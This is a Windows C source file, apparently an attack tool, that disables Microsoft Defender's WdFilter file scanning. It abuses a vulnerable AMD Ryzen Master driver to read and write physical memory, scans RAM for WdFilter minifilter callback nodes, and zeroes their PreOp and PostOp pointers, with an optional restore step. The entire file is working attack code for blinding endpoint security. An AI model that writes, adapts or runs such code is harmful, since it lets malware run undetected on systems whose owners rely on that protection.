/*
 * flt_bypass_v3.c — Zero WdFilter MiniFilter PreOp/PostOp Callbacks
 *
 * History of failures:
 *   v1: minimal checks -> 256 false positives hit cap -> BSOD
 *   v2: strict NodeTypeFlags/PreOperationFlag checks -> 0 results
 *       (those field values are build-specific, not always {1,3}/1)
 *
 * v3 approach:
 *   Stage 1 per-node: ONLY build-agnostic checks
 *     preop in WdFilter VA range | flink/blink/filter = kernel VA | postop = NULL or kVA
 *   Stage 2 post-scan: filter pointer consistency
 *     All real WdFilter _CALLBACK_NODEs share ONE _FLT_FILTER* pointer.
 *     Build a frequency table; keep only nodes with the majority filter value.
 *     Require >= MIN_VOTES before trusting. False positives have scattered filter values.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -o flt_bypass_v3.exe flt_bypass_v3.c -lkernel32 -ladvapi32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Driver ──────────────────────────────────────────────────────────── */
#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* ── Physical ranges ─────────────────────────────────────────────────── */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;;i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(hKey,i,vname,&vn,NULL,&type,NULL,&vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf = (uint8_t*)malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf = NULL;
    }
    RegCloseKey(hKey);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt = *(DWORD*)(buf+16); uint8_t *p = buf+20;
    for (DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if (p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base = *(uint64_t*)(p+4);
        g_ranges[g_nranges].size = *(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i=0;i<g_nranges;i++)
        if (pa>=g_ranges[i].base && pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in_buf[12];
    *(uint64_t*)(in_buf) = pa; *(uint32_t*)(in_buf+8) = sz;
    uint32_t out_sz = 12+sz;
    uint8_t *out = (uint8_t*)calloc(1,out_sz); if (!out) return 0;
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev,IOCTL_PHYS_READ,in_buf,sizeof(in_buf),out,out_sz,&got,NULL);
    if (ok&&got>=12) memcpy(buf,out+12,sz);
    free(out); return ok&&got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa,sz)) return 0;
    uint32_t in_sz = 12+sz;
    uint8_t *in_buf = (uint8_t*)malloc(in_sz); if (!in_buf) return 0;
    *(uint64_t*)(in_buf) = pa; *(uint32_t*)(in_buf+8) = sz;
    memcpy(in_buf+12,data,sz);
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev,IOCTL_PHYS_WRITE,in_buf,in_sz,NULL,0,&got,NULL);
    free(in_buf); return ok;
}

static int phys_write_v(uint64_t pa, const void *data, uint32_t sz)
{
    if (!phys_write(pa,data,sz)) return 0;
    uint8_t buf[8]={0};
    uint32_t vsz = sz<8?sz:8;
    if (!phys_read(pa,buf,vsz)) return 0;
    return memcmp(buf,data,vsz)==0;
}

/* ── Cache eviction — multi-CCD ──────────────────────────────────────── */
#define EVICT_SIZE (256*1024*1024)
static void cache_evict_once(void)
{
    volatile uint8_t *p = (volatile uint8_t*)
        VirtualAlloc(NULL,EVICT_SIZE,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if (!p){Sleep(100);return;}
    for (size_t i=0;i<EVICT_SIZE;i+=64) p[i]=(uint8_t)(i>>6);
    volatile uint64_t s=0;
    for (size_t i=EVICT_SIZE;i>=64;i-=64) s^=p[i-64];
    (void)s;
    VirtualFree((LPVOID)p,0,MEM_RELEASE);
    Sleep(10);
}

static void cache_evict_multiccd(void)
{
    SYSTEM_INFO si; GetSystemInfo(&si);
    DWORD ncpu = si.dwNumberOfProcessors;
    HANDLE thr = GetCurrentThread();
    DWORD_PTR orig = SetThreadAffinityMask(thr,1);
    SetThreadAffinityMask(thr,1ULL);                Sleep(1); cache_evict_once();
    if (ncpu>1){
        SetThreadAffinityMask(thr,(DWORD_PTR)1<<(ncpu-1)); Sleep(1); cache_evict_once();
    }
    SetThreadAffinityMask(thr,orig);
}

/* ── Module enumeration ──────────────────────────────────────────────── */
typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase,ImageBase;
    ULONG  ImageSize,Flags;
    USHORT LoadOrderIndex,InitOrderIndex,LoadCount,OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn=(PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if (!fn) return NULL;
    ULONG sz=0x80000; MOD_LIST *ml=NULL; NTSTATUS st;
    do{free(ml);ml=(MOD_LIST*)malloc(sz*=2);st=fn(11,ml,sz,NULL);}
    while(st==(NTSTATUS)0xC0000004L);
    if(st){free(ml);return NULL;}
    return ml;
}

static int get_module_range(const char *name, uint64_t *base, uint64_t *size)
{
    MOD_LIST *ml=get_module_list(); if(!ml) return 0;
    for(ULONG i=0;i<ml->NumberOfModules;i++){
        char *fn=ml->Modules[i].FullPathName+ml->Modules[i].OffsetToFileName;
        if(_stricmp(fn,name)==0){
            *base=(uint64_t)ml->Modules[i].ImageBase;
            *size=ml->Modules[i].ImageSize;
            free(ml); return 1;
        }
    }
    free(ml); return 0;
}

/* ════════════════════════════════════════════════════════════════════════
 * FltNode
 * ════════════════════════════════════════════════════════════════════════ */
typedef struct {
    uint64_t preop_pa, postop_pa;
    uint64_t preop, postop, filter, flink, blink;
    uint8_t  anchor;       /* 0x20 or 0x18 */
    uint8_t  gap[8];       /* 8 bytes immediately before preop_pa (diagnostics) */
} FltNode;

#define CHUNK       0x10000
#define MAX_RAW     4096
#define SAFE_LIMIT  50
#define MIN_VOTES   3

static uint8_t g_chunk[CHUNK];
static FltNode g_nodes[SAFE_LIMIT];
static int     g_n_nodes = 0;
static volatile int g_zeroed = 0;

static void do_restore(void)
{
    if (!g_zeroed) return;
    uint8_t z8[8]={0};
    for (int i=0;i<g_n_nodes;i++){
        uint8_t cur[8]={0};
        if (phys_read(g_nodes[i].preop_pa,cur,8)&&memcmp(cur,z8,8)==0)
            phys_write(g_nodes[i].preop_pa,&g_nodes[i].preop,8);
        if (g_nodes[i].postop){
            if (phys_read(g_nodes[i].postop_pa,cur,8)&&memcmp(cur,z8,8)==0)
                phys_write(g_nodes[i].postop_pa,&g_nodes[i].postop,8);
        }
    }
    cache_evict_multiccd();
    g_zeroed=0;
}

static BOOL WINAPI ctrl_handler(DWORD ev)
{
    if (ev==CTRL_C_EVENT||ev==CTRL_BREAK_EVENT||
        ev==CTRL_CLOSE_EVENT||ev==CTRL_LOGOFF_EVENT||ev==CTRL_SHUTDOWN_EVENT){
        if (g_zeroed){
            printf("\n[!] %s — emergency restore...\n",
                   ev==CTRL_C_EVENT?"Ctrl+C":"shutdown");
            fflush(stdout);
            do_restore();
            printf("[+] Restored.\n"); fflush(stdout);
        }
        return FALSE;
    }
    return FALSE;
}

/* ── Stage 1 ─────────────────────────────────────────────────────────── */
static int try_anchor(uint64_t cpa, uint64_t off, uint8_t anc,
                      uint64_t csz, uint64_t wdf_base, uint64_t wdf_size,
                      FltNode *raw, int *n)
{
    if (off < (uint64_t)anc || off+0x10 > csz) return 0;

    uint64_t preop  = *(uint64_t*)(g_chunk+off);
    if (preop<wdf_base||preop>=wdf_base+wdf_size) return 0;

    uint64_t flink  = *(uint64_t*)(g_chunk+off-anc+0x00);
    uint64_t blink  = *(uint64_t*)(g_chunk+off-anc+0x08);
    uint64_t filter = *(uint64_t*)(g_chunk+off-anc+0x10);
    uint64_t postop = *(uint64_t*)(g_chunk+off+0x08);

    if (flink <0xFFFF800000000000ULL) return 0;
    if (blink <0xFFFF800000000000ULL) return 0;
    if (filter<0xFFFF800000000000ULL) return 0;
    if (postop&&postop<0xFFFF800000000000ULL) return 0;
    if (flink==preop||blink==preop||filter==preop) return 0;

    uint64_t pa = cpa+off;
    for (int d=0;d<*n;d++) if (raw[d].preop_pa==pa) return 0;
    if (*n>=MAX_RAW) return 0;

    FltNode *nd   = &raw[*n];
    nd->preop_pa  = pa;
    nd->postop_pa = pa+0x08;
    nd->preop     = preop;
    nd->postop    = postop;
    nd->filter    = filter;
    nd->flink     = flink;
    nd->blink     = blink;
    nd->anchor    = anc;
    if (off>=8) memcpy(nd->gap, g_chunk+off-8, 8);
    else        memset(nd->gap, 0, 8);
    (*n)++;
    return 1;
}

static void scan_stage1(uint64_t wdf_base, uint64_t wdf_size,
                        FltNode *raw, int *n)
{
    *n = 0;
    uint64_t last_prog = 0;
    const uint8_t anchors[2]={0x20,0x18};

    for (int ri=0;ri<g_nranges;ri++){
        uint64_t rend = g_ranges[ri].base+g_ranges[ri].size;
        for (uint64_t cpa=g_ranges[ri].base;cpa<rend;cpa+=CHUNK){
            if (*n>=MAX_RAW) goto done;
            if (cpa-last_prog>=0x80000000ULL){
                printf("  [%5llu MB] raw=%d\n",(unsigned long long)(cpa>>20),*n);
                last_prog=cpa;
            }
            uint64_t csz=rend-cpa; if(csz>CHUNK) csz=CHUNK;
            if (!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;

            for (uint64_t off=0x18;off+0x10<=csz&&*n<MAX_RAW;off+=8)
                for (int ai=0;ai<2;ai++)
                    if (try_anchor(cpa,off,anchors[ai],csz,wdf_base,wdf_size,raw,n))
                        break;
        }
    }
done:;
}

/* ── Stage 2: filter consistency ────────────────────────────────────── */
static int scan_stage2(FltNode *raw, int n_raw,
                       FltNode *out, int max_out,
                       uint64_t *winner_va)
{
    if (n_raw==0) return 0;

    typedef struct{uint64_t v;int c;} E;
    E *freq=(E*)calloc(n_raw,sizeof(E)); if(!freq) return 0;
    int nf=0;
    for (int i=0;i<n_raw;i++){
        int f=0;
        for (int j=0;j<nf;j++) if(freq[j].v==raw[i].filter){freq[j].c++;f=1;break;}
        if (!f){freq[nf].v=raw[i].filter;freq[nf].c=1;nf++;}
    }
    /* sort descending by count */
    for (int i=1;i<nf;i++){
        E key=freq[i]; int j=i-1;
        while(j>=0&&freq[j].c<key.c){freq[j+1]=freq[j];j--;}
        freq[j+1]=key;
    }

    printf("    Total raw candidates   : %d\n",n_raw);
    printf("    Unique filter pointers : %d\n",nf);
    printf("    Top-5 most frequent:\n");
    for (int i=0;i<nf&&i<5;i++)
        printf("      [%d] 0x%016llX  count=%d%s\n",
               i+1,(unsigned long long)freq[i].v,freq[i].c,
               i==0?"  <- candidate winner":"");

    int    votes  = freq[0].c;
    uint64_t win  = freq[0].v;
    free(freq);

    if (votes < MIN_VOTES){
        printf("\n    [!] Best candidate has only %d vote(s) (need >=%d).\n",
               votes,MIN_VOTES);
        printf("        Either the Filter field is at a different offset from\n");
        printf("        PreOperation on this build, or WdFilter has very few\n");
        printf("        volume instances. Inspect the 'gap' bytes shown above\n");
        printf("        to determine the actual struct layout.\n");
        printf("        NOT zeroing anything.\n\n");
        return 0;
    }

    int n_out=0;
    for (int i=0;i<n_raw&&n_out<max_out;i++)
        if (raw[i].filter==win) out[n_out++]=raw[i];

    printf("    Winner: 0x%016llX  (%d votes, discarded %d)\n\n",
           (unsigned long long)win, votes, n_raw-votes);
    *winner_va=win;
    return n_out;
}

static void enable_debug_privilege(void)
{
    HANDLE hTok;
    TOKEN_PRIVILEGES tp={1};
    if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hTok)) return;
    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    BOOL ok=AdjustTokenPrivileges(hTok,FALSE,&tp,0,NULL,NULL);
    printf("[*] SeDebugPrivilege: %s\n",(ok&&GetLastError()==0)?"enabled":"FAILED");
    CloseHandle(hTok);
}

/* ════════════════════════════════════════════════════════════════════════ */
int main(void)
{
    SetConsoleOutputCP(CP_UTF8);
    printf("=== WdFilter MiniFilter Callback Zero  v3 ===\n\n");

    g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
    if (g_dev==INVALID_HANDLE_VALUE){printf("[-] Cannot open device: %lu\n",GetLastError());return 1;}
    printf("[+] Device opened\n");
    enable_debug_privilege();
    printf("\n");

    load_ranges();
    printf("[1] Physical ranges: %d\n",g_nranges);
    if (g_nranges==0){printf("[-] No ranges\n");CloseHandle(g_dev);return 1;}
    for (int i=0;i<g_nranges;i++)
        printf("    [%d] 0x%016llX  size=0x%llX\n",i,
               (unsigned long long)g_ranges[i].base,(unsigned long long)g_ranges[i].size);
    printf("\n");

    printf("[2] WdFilter module range...\n");
    uint64_t wdf_base=0,wdf_size=0;
    if (!get_module_range("WdFilter.sys",&wdf_base,&wdf_size)){
        printf("[-] WdFilter.sys not loaded\n");CloseHandle(g_dev);return 1;
    }
    printf("    VA=0x%016llX  size=0x%llX\n\n",
           (unsigned long long)wdf_base,(unsigned long long)wdf_size);

    SetConsoleCtrlHandler(ctrl_handler,TRUE);

    /* ── Stage 1 ──────────────────────────────────────────────────────── */
    printf("[3] Stage 1 — raw scan (anchors +0x20 and +0x18, cap=%d)...\n\n",MAX_RAW);
    FltNode *raw=(FltNode*)calloc(MAX_RAW,sizeof(FltNode));
    if (!raw){printf("[-] OOM\n");CloseHandle(g_dev);return 1;}
    int n_raw=0;
    scan_stage1(wdf_base,wdf_size,raw,&n_raw);
    printf("\n    Raw candidates: %d%s\n\n",
           n_raw,n_raw==MAX_RAW?" [CAP HIT]":"");

    if (n_raw==0){
        printf("[-] No candidates found.\n");
        printf("    Stage 1 requires: value in WdFilter VA range at offset 'off',\n");
        printf("    with 3 kernel VAs at off-0x20/-0x18/-0x10 (or -0x18/-0x10/-0x08).\n");
        printf("    If the Filter field is at a different offset from PreOperation\n");
        printf("    on this build, stage 1 will find nothing. In that case the\n");
        printf("    approach needs to be adapted for the actual struct layout.\n");
        free(raw);CloseHandle(g_dev);return 1;
    }

    /* Print first 20 raw candidates with gap bytes for layout analysis */
    int show = n_raw<20?n_raw:20;
    printf("    First %d raw candidates (gap = 8 bytes before preop_PA):\n",show);
    printf("    %-4s  %-5s  %-20s  %-20s  %-18s  %s\n",
           "#","anc","node_PA","preop_VA","gap[preop-8..preop-1]","filter");
    for (int i=0;i<show;i++){
        printf("    %-4d  +0x%02X  0x%016llX  WdFilter+0x%08llX  ",
               i+1,raw[i].anchor,
               (unsigned long long)(raw[i].preop_pa-raw[i].anchor),
               (unsigned long long)(raw[i].preop-wdf_base));
        for (int b=0;b<8;b++) printf("%02X",raw[i].gap[b]);
        printf("  0x%016llX\n",(unsigned long long)raw[i].filter);
    }
    if (n_raw>20) printf("    ... +%d more\n",n_raw-20);
    printf("\n");

    /* ── Stage 2 ──────────────────────────────────────────────────────── */
    printf("[3] Stage 2 — filter pointer consistency...\n");
    uint64_t winner=0;
    g_n_nodes=scan_stage2(raw,n_raw,g_nodes,SAFE_LIMIT,&winner);
    free(raw);

    if (g_n_nodes==0){CloseHandle(g_dev);return 1;}
    if (g_n_nodes>SAFE_LIMIT){
        printf("[-] %d nodes after filtering > safe limit %d — aborting.\n",g_n_nodes,SAFE_LIMIT);
        CloseHandle(g_dev);return 1;
    }

    /* ── Summary ─────────────────────────────────────────────────────── */
    printf("[4] Accepted: %d nodes  (_FLT_FILTER=0x%016llX)\n\n",
           g_n_nodes,(unsigned long long)winner);

    /* group by preop VA */
    {
        typedef struct{uint64_t va;int c;uint8_t a;}G;
        G grp[32];int ng=0;
        for(int i=0;i<g_n_nodes;i++){
            int f=0;
            for(int j=0;j<ng;j++) if(grp[j].va==g_nodes[i].preop){grp[j].c++;f=1;break;}
            if(!f&&ng<32){grp[ng].va=g_nodes[i].preop;grp[ng].c=1;grp[ng].a=g_nodes[i].anchor;ng++;}
        }
        printf("    Unique PreOp functions = IRP_MJ hooks (%d):\n",ng);
        for(int j=0;j<ng;j++)
            printf("      WdFilter+0x%08llX  anchor=+0x%02X  x%d vol\n",
                   (unsigned long long)(grp[j].va-wdf_base),grp[j].a,grp[j].c);
        printf("\n");
    }

    printf("    %-4s  %-5s  %-20s  %-20s  %-18s  %s\n",
           "#","anc","node_PA","preop_VA","gap[preop-8..preop-1]","postop");
    for(int i=0;i<g_n_nodes;i++){
        printf("    %-4d  +0x%02X  0x%016llX  WdFilter+0x%08llX  ",
               i+1,g_nodes[i].anchor,
               (unsigned long long)(g_nodes[i].preop_pa-g_nodes[i].anchor),
               (unsigned long long)(g_nodes[i].preop-wdf_base));
        for(int b=0;b<8;b++) printf("%02X",g_nodes[i].gap[b]);
        printf("  %s\n",g_nodes[i].postop?"yes":"null");
    }
    printf("\n");
    printf("    gap bytes = [preop_PA-8 .. preop_PA-1] = node+0x18..+0x1F (anchor +0x20)\n");
    printf("    Inspect these to confirm actual struct layout on this build.\n\n");

    printf("    --> Enter to zero %d nodes (Ctrl+C aborts): ",g_n_nodes);
    fflush(stdout);getchar();printf("\n");

    /* ── Zero ─────────────────────────────────────────────────────────── */
    printf("[5] Zeroing...\n\n");
    uint8_t z8[8]={0};
    int ok_cnt=0,fail_cnt=0;
    for(int i=0;i<g_n_nodes;i++){
        int ok_pre =phys_write_v(g_nodes[i].preop_pa, z8,8);
        int ok_post=(!g_nodes[i].postop)?1:phys_write_v(g_nodes[i].postop_pa,z8,8);
        printf("    [%2d] PreOp=%-4s  PostOp=%-4s  anchor=+0x%02X  node=0x%016llX\n",
               i+1,ok_pre?"OK":"FAIL",
               g_nodes[i].postop?(ok_post?"OK":"FAIL"):"null",
               g_nodes[i].anchor,
               (unsigned long long)(g_nodes[i].preop_pa-g_nodes[i].anchor));
        if(ok_pre) ok_cnt++; else fail_cnt++;
    }
    printf("\n    %d/%d zeroed",ok_cnt,g_n_nodes);
    if(fail_cnt) printf("  (%d FAILED)",fail_cnt);
    printf("\n\n");

    if(ok_cnt==0){printf("[-] All writes failed.\n");CloseHandle(g_dev);return 1;}

    printf("[6] Cache eviction (multi-CCD)... ");fflush(stdout);
    cache_evict_multiccd();
    printf("done\n\n");

    g_zeroed=1;

    printf("=============================================================\n");
    printf("  WdFilter file scanning: DISABLED (%d/%d nodes zeroed)\n",ok_cnt,g_n_nodes);
    printf("  fltmgr reads PreOperation=NULL -> skips WdFilter on all I/O\n\n");
    printf("  Press Enter to RESTORE.  Ctrl+C also restores.\n");
    printf("=============================================================\n");
    fflush(stdout);getchar();printf("\n");

    /* ── Restore ─────────────────────────────────────────────────────── */
    printf("[7] Restoring...\n\n");
    do_restore();

    int v=0;
    for(int i=0;i<g_n_nodes;i++){
        uint8_t cur[8]={0};
        if(phys_read(g_nodes[i].preop_pa,cur,8)&&memcmp(cur,&g_nodes[i].preop,8)==0) v++;
    }
    printf("    Verified: %d/%d\n\n",v,g_n_nodes);
    printf("[+] WdFilter scanning re-enabled.\n");

    CloseHandle(g_dev);
    return 0;
}
